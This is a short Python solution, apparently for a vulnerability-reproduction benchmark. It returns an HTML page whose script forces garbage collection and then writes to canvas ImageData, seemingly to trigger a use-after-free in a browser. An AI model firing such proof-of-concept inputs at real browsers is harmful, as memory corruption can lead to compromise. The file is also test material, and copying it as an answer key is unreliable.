class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""<!DOCTYPE html>
<html>
<head></head>
<body>
<script>
(function() {
    var canvas = document.createElement('canvas');
    canvas.width = 200;
    canvas.height = 200;
    var ctx = canvas.getContext('2d');
    var imageData = ctx.createImageData(200, 200);
    // Force GC by allocating many large buffers
    var garbage = [];
    for (var i = 0; i < 1000; i++) {
        garbage.push(new ArrayBuffer(1024 * 1024));
        if (i % 100 === 0) {
            // Access to keep alive, but hope GC runs
            imageData.data[0] = i % 256;
        }
    }
    // Clear garbage to allow GC
    garbage = null;
    // Now access after potential GC
    for (var j = 0; j < 100; j++) {
        imageData.data[j] = 255;
    }
    console.log(imageData.data[0]);
    // Create another to trigger more
    var canvas2 = document.createElement('canvas');
    canvas2.width = 100;
    canvas2.height = 100;
    var ctx2 = canvas2.getContext('2d');
    var imageData2 = ctx2.getImageData(0, 0, 100, 100);
    imageData2.data[0] = 0;
})();
</script>
</body>
</html>"""
        return poc